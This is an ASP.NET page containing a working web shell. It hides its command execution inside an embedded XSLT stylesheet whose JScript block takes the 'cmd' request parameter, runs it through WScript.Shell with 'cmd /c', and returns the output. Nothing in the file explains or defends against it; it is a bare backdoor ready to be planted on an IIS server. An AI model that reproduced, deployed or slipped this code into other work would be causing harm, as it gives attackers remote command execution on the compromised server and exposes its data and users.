<%@page language="C#"%>

<%@ import Namespace="System.IO"%>

<%@ import Namespace="System.Xml"%>

<%@ import Namespace="System.Xml.Xsl"%>

<%

string xml=@"<?xml version=""1.0""?><root>test</root>";

string xslt=@"<?xml version='1.0'?>

<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:zcg=""zcgonvh"">

    <msxsl:script language=""JScript"" implements-prefix=""zcg"">

    <msxsl:assembly name=""mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/>

    <msxsl:assembly name=""System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/>

    <msxsl:assembly name=""System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/>

    <msxsl:assembly name=""System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/>

        <![CDATA[function xml(){

        var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;

        var command = Request.Item['cmd'];

        var r = new ActiveXObject(""WScript.Shell"").Exec(""cmd /c ""+command);

        var OutStream = r.StdOut;

        var Str = """";

        while (!OutStream.atEndOfStream) {

            Str = Str + OutStream.readAll();

            }

        Response.Write(""<pre>""+Str+""</pre>"");

        }]]>

    </msxsl:script>

<xsl:template match=""/root"">

    <xsl:value-of select=""zcg:xml()""/>

</xsl:template>

</xsl:stylesheet>";

XmlDocument xmldoc=new XmlDocument();

xmldoc.LoadXml(xml);

XmlDocument xsldoc=new XmlDocument();

xsldoc.LoadXml(xslt);

XsltSettings xslt_settings = new XsltSettings(false, true);

xslt_settings.EnableScript = true;

try{

    XslCompiledTransform xct=new XslCompiledTransform();

    xct.Load(xsldoc,xslt_settings,new XmlUrlResolver());

    xct.Transform(xmldoc,null,new MemoryStream());

}

catch (Exception e){

    Response.Write("Error");

}

%>
